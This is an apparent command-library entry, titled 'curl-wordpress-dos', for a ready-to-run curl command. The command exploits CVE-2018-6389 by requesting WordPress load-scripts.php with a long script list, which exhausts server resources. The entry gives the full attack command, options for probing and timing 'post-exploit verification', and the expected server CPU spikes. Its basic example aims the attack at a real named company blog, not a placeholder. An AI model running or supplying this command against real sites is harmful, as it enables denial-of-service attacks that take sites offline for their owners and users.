---
data: >-
  curl
  "https://target.com/wp-admin/load-scripts.php?load=common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer"
tags:
  - dos
  - web
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.400Z'
id: f6c90857-0cd4-4b3c-86f0-415c80d5b7ad
verified: false
validated: true
submitted: true
---
# curl-wordpress-dos

## Command

```bash
curl "https://target.com/wp-admin/load-scripts.php?load=common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer"
```

## Description

This curl command sends a GET request to the WordPress load-scripts.php endpoint with an extensive 'load' parameter listing numerous JavaScript files, exploiting CVE-2018-6389 to cause resource exhaustion and DoS. Use it to test or demonstrate the vulnerability on vulnerable WordPress sites.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target WordPress site's load-scripts.php endpoint | Yes |
| ?load= | Comma-separated list of script handles to load | Yes |
| -I (optional) | Use HEAD request for probing | No |
| -w "%{time_total}" (optional) | Measure response time for impact verification | No |

## Examples

### Basic Usage

```bash
curl "https://blog.yelp.com/wp-admin/load-scripts.php?load=common,jquery,prototype"
```

### Advanced Usage

```bash
curl -w "%{time_total} seconds" "https://target.com/"  # For post-exploit verification
curl -I "https://target.com/wp-admin/load-scripts.php"  # For endpoint probing
```

## Expected Output

A large concatenated JavaScript file (~3MB) streamed to stdout, or HTTP headers for HEAD requests. For timing checks, a numeric value showing response duration. Server-side: High CPU/memory spikes.

## Related

- [[Related Procedure: Exploit-WordPress-Load-Scripts-DoS]]
